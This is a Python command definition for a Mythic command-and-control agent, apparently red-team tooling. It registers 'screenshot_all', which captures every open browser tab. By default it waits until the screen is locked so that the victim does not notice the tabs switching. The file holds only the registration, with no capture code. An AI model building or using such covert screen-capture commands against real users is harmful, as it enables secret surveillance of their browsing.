from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class ScreenshotAllArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="force",
                type=ParameterType.Boolean,
                default_value=False,
                description=(
                    "Capture even if the screen is unlocked. The user will see "
                    "tabs flipping briefly. Default: false (only runs when screen is locked)."
                ),
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class ScreenshotAllCommand(CommandBase):
    cmd            = "screenshot_all"
    needs_admin    = False
    help_cmd       = 'screenshot_all {"force": true}'
    description    = (
        "Capture every open tab across all windows and bundle them into a single "
        "HTML file. Requires screen to be locked (user would see tab switching). "
        "Use force=true to override."
    )
    version        = 2
    author         = "@asaurusrex"
    argument_class = ScreenshotAllArguments
    parameters     = []
    attackmapping  = ["T1113"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.display_params = " (force)" if task.args.get_arg("force") else " (wait for lock)"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
